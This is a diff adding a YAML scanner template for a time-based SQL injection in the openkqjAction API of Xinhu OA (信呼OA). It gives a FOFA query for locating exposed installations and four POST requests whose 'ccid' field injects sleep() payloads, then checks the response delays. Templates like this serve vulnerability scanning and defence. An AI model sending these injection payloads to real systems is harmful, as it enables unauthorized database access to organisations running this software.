@@ -1,0 +1,57 @@
+id: xinhuoa-openkqjaction-sqli
+
+info:
+  name: 信呼OA openkqjAction SQL延时注入漏洞
+  author: zan8in
+  severity: high
+  description: |
+    fofa: app="信呼协同办公系统" || product="信呼-OA系统"
+  tags: xinhuoa,sqli,xinhu,oa
+  created: 2025/11/24
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /index.php?a=api&m=openkqj|openapi&d=task&sn=1&/post
+      headers:
+        Content-Type: application/json
+      body: |
+        {"b":{"data":"fingerprint","ccid":"a' or sleep(2)#'","fingerprint":"xx"}}
+    expression: |
+      response.latency <= 6000 &&  
+      response.latency >= 4000
+  r1:
+    request:
+      method: POST
+      path: /index.php?a=api&m=openkqj|openapi&d=task&sn=1&/post
+      headers:
+        Content-Type: application/json
+      body: |
+        {"b":{"data":"fingerprint","ccid":"a' or sleep(4)#'","fingerprint":"xx"}}
+    expression: |
+      response.latency <= 10000 &&  
+      response.latency >= 8000
+  r2:
+    request:
+      method: POST
+      path: /index.php?a=api&m=openkqj|openapi&d=task&sn=1&/post
+      headers:
+        Content-Type: application/json
+      body: |
+        {"b":{"data":"fingerprint","ccid":"a' or sleep(2)#'","fingerprint":"xx"}}
+    expression: |
+      response.latency <= 6000 &&  
+      response.latency >= 4000
+  r3:
+    request:
+      method: POST
+      path: /index.php?a=api&m=openkqj|openapi&d=task&sn=1&/post
+      headers:
+        Content-Type: application/json
+      body: |
+        {"b":{"data":"fingerprint","ccid":"a' or sleep(4)#'","fingerprint":"xx"}}
+    expression: |
+      response.latency <= 10000 &&  
+      response.latency >= 8000
+expression: r0() && r1() && r2() && r3()
